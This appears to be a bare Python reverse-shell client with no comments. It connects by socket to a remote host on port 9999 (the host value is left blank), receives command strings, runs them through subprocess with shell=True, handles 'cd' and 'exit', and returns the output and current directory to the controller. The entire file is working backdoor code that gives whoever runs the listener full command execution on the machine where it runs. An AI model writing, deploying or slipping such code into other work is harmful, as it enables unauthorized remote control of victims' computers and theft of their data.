import socket
import os
import subprocess
import sys

s = socket.socket()

host = ''
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)

    try:

        if(data.decode("utf-8") == "exit"):
            s.close()
            sys.exit()

        if(data[:2].decode("utf-8") == "cd"):
            os.chdir(data[3:].decode("utf-8"))
            output_str = ""
            currentWD = os.getcwd() + "> "


        elif len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8") + "\n"
            currentWD = os.getcwd() + "> "

        s.send(str.encode(output_str + currentWD))

    except os.error as message:
        currentWD = os.getcwd() + "> "
        s.send(str.encode(str(message) + '\n' + str(currentWD)))
        